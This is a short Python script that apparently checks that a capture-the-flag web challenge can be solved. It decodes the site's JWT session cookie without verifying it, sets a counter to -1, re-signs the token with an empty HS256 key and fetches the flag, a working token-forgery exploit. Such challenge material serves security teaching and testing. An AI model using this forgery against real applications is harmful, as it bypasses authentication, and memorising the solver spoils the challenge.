# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "pyjwt",
#     "requests",
# ]
# ///
from typing import Tuple
import requests
import os
import jwt

s = requests.Session()

expected_flag = os.environ.get("flag")
if expected_flag is None:
    raise ValueError("No flag found in environment")

target = os.environ.get("target")
if target is None:
    raise ValueError("No target found in environment")


print("Testing "+ target + " is solvable")

def check_flag(expected_flag: str, session: requests.Session, target: str) -> Tuple[bool, str]:
    resp = session.get(f"{target}/flag")
    t = resp.text
    if expected_flag in t:
        return (True, t)
    return (False, t)
    

resp = s.get(f"{target}/")
resp.raise_for_status()
cookie = s.cookies.get("d")
if cookie is None:
    raise ValueError("No cookie found")

cookie = jwt.decode(cookie, algorithms=["HS256"], options={"verify_signature": False})
print(f"original cookie data: {cookie}")
success, data = check_flag(expected_flag, s, target)
if success:
    print(f"failed: flag found without changes: {data}")
    exit(1)
else:
    print(f"success: flag not found initially")

r = s.get(f"{target}/add")
cookie = s.cookies.get("d")
if cookie is None:
    raise ValueError("No cookie found")
cookie = jwt.decode(cookie, algorithms=["HS256"], options={"verify_signature": False})
print(f"server-modified data: {cookie}")
cookie["count"] = -1
print(f"modified data: {cookie}")
cookie = jwt.encode(cookie, "", algorithm="HS256")
s.cookies.clear()
s.cookies.set("d", cookie)
success, data = check_flag(expected_flag, s, target)
if success:
    print(f"success: flag found with client modified data")
else:
    print(f"failed: flag not found with client modified data {data}")
    exit(1)